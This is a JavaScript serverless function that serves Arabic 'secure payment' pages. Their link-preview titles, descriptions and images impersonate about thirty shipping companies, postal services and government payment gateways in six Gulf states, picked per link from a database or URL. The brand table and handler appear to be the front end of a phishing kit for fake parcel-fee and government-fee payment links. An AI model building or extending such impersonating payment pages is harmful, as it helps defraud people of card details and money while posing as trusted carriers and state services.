const fs = require('fs');
const path = require('path');
const { createClient } = require('@supabase/supabase-js');

// Updated Service data mapping - matches src/lib/serviceLogos.ts
const serviceData = {
  aramex: {
    name: "أرامكس - Aramex",
    description: "أكمل عملية الدفع بأمان تام لشحنة أرامكس. منصة الدفع الموثوقة لخدمات الشحن السريع والحلول اللوجستية.",
    ogImage: "/og-aramex.jpg"
  },
  dhl: {
    name: "دي إتش إل - DHL", 
    description: "سدد رسوم شحنة DHL الخاصة بك بأمان. الشبكة العالمية الأكبر للشحن السريع توفر لك حلول دفع موثوقة.",
    ogImage: "/og-dhl.jpg"
  },
  fedex: {
    name: "فيديكس - FedEx",
    description: "ادفع بأمان لشحنات فيديكس الدولية. رائدة الشحن الدولي توفر لك نظام دفع مشفر لضمان وصول شحنتك.",
    ogImage: "/og-fedex.jpg"
  },
  ups: {
    name: "يو بي إس - UPS",
    description: "أكمل دفع شحنة UPS الخاصة بك عبر بوابتنا الآمنة. حلول لوجستية متكاملة وخدمات شحن عالمية احترافية.",
    ogImage: "/og-ups.jpg"
  },
  empost: {
    name: "البريد الإماراتي - Emirates Post",
    description: "سدد رسوم البريد الإماراتي الرسمي بأمان. خدمات بريدية وشحن متميزة محلياً ودولياً.",
    ogImage: "/og-empost.jpg"
  },
  smsa: {
    name: "سمسا - SMSA",
    description: "أكمل دفع شحنة سمسا الخاصة بك بأمان. الرائدة في الشحن السعودي توفر لك خدمات توصيل سريعة وموثوقة.",
    ogImage: "/og-smsa.jpg"
  },
  zajil: {
    name: "زاجل - Zajil",
    description: "ادفع بأمان لشحنة زاجل. شحن سريع وموثوق داخل المملكة العربية السعودية مع تغطية شاملة لكافة المناطق.",
    ogImage: "/og-zajil.jpg"
  },
  naqel: {
    name: "ناقل - Naqel", 
    description: "سدد رسوم شحنة ناقل إكسبريس بأمان. خدمات شحن متطورة وحلول لوجستية ذكية لضمان وصول شحنتك بسرعة.",
    ogImage: "/og-naqel.jpg"
  },
  saudipost: {
    name: "البريد السعودي - SPL",
    description: "ادفع رسوم البريد السعودي (SPL) عبر نظامنا الآمن. المشغل الوطني الرسمي يقدم خدمات بريدية وشحن متطورة.",
    ogImage: "/og-saudipost.jpg"
  },
  kwpost: {
    name: "البريد الكويتي - Kuwait Post",
    description: "سدد رسوم البريد الكويتي الرسمي بأمان. خدمات بريدية وشحن محلية ودولية موثوقة.",
    ogImage: "/og-kwpost.jpg"
  },
  qpost: {
    name: "البريد القطري - Qatar Post",
    description: "أكمل دفع خدمات البريد القطري بأمان. خدمات بريدية وشحن احترافية تضمن لك السرعة والأمان.",
    ogImage: "/og-qpost.jpg"
  },
  omanpost: {
    name: "البريد العُماني - Oman Post",
    description: "ادفع رسوم البريد العُماني الرسمي عبر بوابتنا الآمنة. خدمات بريدية وشحن موثوقة تربط سلطنة عُمان بالعالم.",
    ogImage: "/og-omanpost.jpg"
  },
  bahpost: {
    name: "البريد البحريني - Bahrain Post",
    description: "سدد رسوم البريد البحريني بأمان. خدمات بريدية وشحن احترافية وموثوقة في مملكة البحرين.",
    ogImage: "/og-bahpost.jpg"
  },
  jinakum: {
    name: "جينا كم - Jinakum",
    description: "أكمل دفع شحنة جينا كم بأمان. حلول شحن مبتكرة وخدمات لوجستية متطورة توفر لك السرعة والموثوقية.",
    ogImage: "/og-jinakum.jpg"
  },
  jinaken: {
    name: "جيناكن - Jinaken",
    description: "ادفع بأمان لخدمات جيناكن للشحن. شركة توصيل عُمانية متميزة تقدم خدمات لوجستية احترافية.",
    ogImage: "/og-jinaken.jpg"
  },
  genacom: {
    name: "جيناكوم - Genacom",
    description: "سدد رسوم شحن جيناكوم بأمان. خدمات لوجستية احترافية وشحن سريع مع نظام تتبع متطور.",
    ogImage: "/og-genacom.jpg"
  },
  albaraka: {
    name: "مجموعة البركة - Al Baraka",
    description: "أكمل عمليات الدفع لمجموعة البركة بأمان. خدمات لوجستية وحلول مالية متكاملة تلبي احتياجاتك في الخليج.",
    ogImage: "/og-albaraka.jpg"
  },
  alfuttaim: {
    name: "مجموعة الفطيم - Al Futtaim",
    description: "سدد رسوم الفطيم للخدمات اللوجستية بأمان. حلول شحن وتوزيع عالمية احترافية مدعومة بواحدة من أكبر المجموعات.",
    ogImage: "/og-alfuttaim.jpg"
  },
  alshaya: {
    name: "مجموعة الشايع - Al Shaya",
    description: "ادفع بأمان لخدمات الشايع اللوجستية. شبكة توزيع واسعة وحلول شحن احترافية تدعم كبرى العلامات التجارية.",
    ogImage: "/og-alshaya.jpg"
  },
  shipco: {
    name: "شيبكو - Shipco",
    description: "أكمل دفع خدمات شيبكو بأمان. رائدة الشحن البحري والجوي والبري توفر لك حلول نقل دولية شاملة.",
    ogImage: "/og-shipco.jpg"
  },
  bahri: {
    name: "بحري - Bahri",
    description: "سدد رسوم الشركة الوطنية للشحن (بحري) بأمان. الرائدة العالمية في النقل البحري والخدمات اللوجستية.",
    ogImage: "/og-bahri.jpg"
  },
  hellmann: {
    name: "هيلمان - Hellmann",
    description: "ادفع بأمان لخدمات هيلمان العالمية. شبكة لوجستية دولية تقدم حلول شحن احترافية وتغطية عالمية شاملة.",
    ogImage: "/og-hellmann.jpg"
  },
  dsv: {
    name: "دي إس في - DSV",
    description: "أكمل دفع خدمات DSV اللوجستية بأمان. شبكة عالمية توفر حلول نقل وشحن متكاملة.",
    ogImage: "/og-dsv.jpg"
  },
  agility: {
    name: "أجيليتي - Agility",
    description: "سدد رسوم أجيليتي بأمان. رائدة حلول سلاسل الإمداد تقدم خدمات لوجستية متكاملة ومبتكرة في منطقة الخليج.",
    ogImage: "/og-agility-temp.jpg"
  },
  sadad: {
    name: "سداد - SADAD",
    description: "بوابة دفع سداد الآمنة. سدد رسوم الجوازات، المرور، رخص القيادة، والخدمات الحكومية عبر نظام موثوق.",
    ogImage: "/og-government_payment.jpg"
  },
  benefit: {
    name: "بنفت - BENEFIT",
    description: "بوابة دفع بنفت الآمنة. سدد رسوم الخدمات الحكومية، المخالفات، والخدمات البلدية في مملكة البحرين.",
    ogImage: "/og-government_payment.jpg"
  },
  knet: {
    name: "كي نت - KNET",
    description: "بوابة دفع كي نت الآمنة. نظام الدفع الإلكتروني الرائد في الكويت لسداد الرسوم والخدمات الحكومية.",
    ogImage: "/og-government_payment.jpg"
  },
  omannet: {
    name: "عُمان نت - OmanNet",
    description: "بوابة دفع عُمان نت (بطاقة مال) الآمنة. سدد رسوم الجوازات، المخالفات والخدمات البلدية في سلطنة عُمان.",
    ogImage: "/og-government_payment.jpg"
  },
  jaywan: {
    name: "جيوان - Jaywan",
    description: "بوابة دفع جيوان الآمنة. نظام البطاقة الوطنية الإماراتي لسداد رسوم الهوية والخدمات الحكومية.",
    ogImage: "/og-government_payment.jpg"
  },
  "qatar-gov": {
    name: "بوابة الدفع القطرية",
    description: "سدد رسوم الخدمات الحكومية القطرية بأمان. بوابة موحدة لدفع رسوم الجوازات، الهوية، والمخالفات.",
    ogImage: "/og-government_payment.jpg"
  }
};

// Country data mapping - matches src/utils/countryData.ts
const countryData = {
  AE: { nameAr: "الإمارات العربية المتحدة", name: "United Arab Emirates" },
  SA: { nameAr: "المملكة العربية السعودية", name: "Saudi Arabia" },
  KW: { nameAr: "دولة الكويت", name: "Kuwait" },
  QA: { nameAr: "دولة قطر", name: "Qatar" },
  OM: { nameAr: "سلطنة عُمان", name: "Oman" },
  BH: { nameAr: "مملكة البحرين", name: "Bahrain" }
};

// Supabase configuration
const supabaseUrl = process.env.VITE_SUPABASE_URL;
const supabaseKey = process.env.VITE_SUPABASE_ANON_KEY;
const supabase = supabaseUrl && supabaseKey ? createClient(supabaseUrl, supabaseKey) : null;

// Function to get link data from database
async function getLinkData(linkId) {
  if (!supabase) return null;
  try {
    const { data, error } = await supabase
      .from('links')
      .select('*')
      .eq('id', linkId)
      .single();
    if (error) return null;
    return data;
  } catch (error) {
    return null;
  }
}

exports.handler = async (event, context) => {
  // Use a variable to store the final HTML to avoid duplication in catch block
  let finalHtml = '';

  try {
    const { path: requestPath, queryStringParameters, headers } = event;
    const siteUrl = `https://${headers.host}`;
    
    // Route matching
    let countryCode, type, id;
    let rMatch = requestPath.match(/^\/r\/([A-Z]{2})\/([a-z-]+)\/([a-zA-Z0-9-]+)$/);
    let pMatch = requestPath.match(/^\/p\/([a-zA-Z0-9-]+)/);
    let payMatch = requestPath.match(/^\/pay\/([a-zA-Z0-9-]+)/);

    if (rMatch) {
      [, countryCode, type, id] = rMatch;
    } else if (pMatch) {
      [, id] = pMatch;
    } else if (payMatch) {
      [, id] = payMatch;
    }

    if (id) {
      const linkData = await getLinkData(id);
      if (linkData) {
        countryCode = linkData.country_code || countryCode;
        type = linkData.type || type;
      }

      countryCode = countryCode || 'SA';
      type = type || 'shipping';
      const country = countryData[countryCode.toUpperCase()] || countryData.SA;
      
      let serviceKey = 'aramex';
      if (queryStringParameters?.company) {
        serviceKey = queryStringParameters.company;
      } else if (linkData?.payload?.service_key) {
        serviceKey = linkData.payload.service_key;
      }

      const service = serviceData[serviceKey.toLowerCase()] || serviceData.aramex;
      let title = `${service.name} | دفع آمن - ${country.nameAr}`;
      let description = service.description;
      let ogImage = service.ogImage;

      if (type === 'chalet') {
        const chaletName = linkData?.payload?.chalet_name || 'شاليه';
        title = `حجز ${chaletName} | دفع آمن - ${country.nameAr}`;
      } else if (type === 'invoices') {
        title = `فاتورة إلكترونية | دفع آمن - ${country.nameAr}`;
      }

      const fullOgImage = ogImage.startsWith('http') ? ogImage : `${siteUrl}${ogImage}`;
      const secureOgImage = fullOgImage.replace('http://', 'https://');
      const fullUrl = `${siteUrl}${requestPath}`;

      // Dynamic Asset Discovery
      let scriptTag = '<script type="module" crossorigin src="/assets/index.js"></script>';
      let styleTag = '<link rel="stylesheet" crossorigin href="/assets/index.css">';

      try {
        const possiblePaths = [
          path.join(__dirname, 'dist/index.html'),
          path.join(__dirname, 'index.html'),
          path.join(__dirname, '../../dist/index.html'),
          path.join(process.cwd(), 'dist/index.html')
        ];

        let indexHtml = null;
        for (const p of possiblePaths) {
          if (fs.existsSync(p)) {
            indexHtml = fs.readFileSync(p, 'utf8');
            break;
          }
        }

        if (indexHtml) {
          const scriptMatch = indexHtml.match(/<script[^>]*src=["']([^"']+\/assets\/index-[^"']+\.js)["'][^>]*>/);
          const styleMatch = indexHtml.match(/<link[^>]*href=["']([^"']+\/assets\/index-[^"']+\.css)["'][^>]*>/);
          if (scriptMatch) scriptTag = `<script type="module" crossorigin src="${scriptMatch[1]}"></script>`;
          if (styleMatch) styleTag = `<link rel="stylesheet" crossorigin href="${styleMatch[1]}">`;
        }
      } catch (e) {}

      finalHtml = `<!doctype html>
<html lang="ar" dir="rtl">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>${title}</title>
    <meta name="description" content="${description}" />
    <meta property="og:type" content="website" />
    <meta property="og:title" content="${title}" />
    <meta property="og:description" content="${description}" />
    <meta property="og:image" content="${secureOgImage}" />
    <meta property="og:url" content="${fullUrl}" />
    <meta property="og:site_name" content="نظام الدفع الآمن" />
    <meta property="og:locale" content="ar_AR" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="${title}" />
    <meta name="twitter:description" content="${description}" />
    <meta name="twitter:image" content="${secureOgImage}" />
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">
    ${styleTag}
  </head>
  <body>
    <div id="root"></div>
    ${scriptTag}
  </body>
</html>`;

      return {
        statusCode: 200,
        headers: { 'Content-Type': 'text/html; charset=utf-8' },
        body: finalHtml
      };
    } else {
      throw new Error('No ID found');
    }
  } catch (error) {
    // Return fallback React app HTML on error
    return {
      statusCode: 200,
      headers: { 'Content-Type': 'text/html; charset=utf-8' },
      body: `<!doctype html>
<html lang="ar" dir="rtl">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>نظام الدفع الآمن</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">
    <script type="module" crossorigin src="/assets/index.js"></script>
    <link rel="stylesheet" crossorigin href="/assets/index.css">
  </head>
  <body>
    <div id="root"></div>
  </body>
</html>`
    };
  }
};
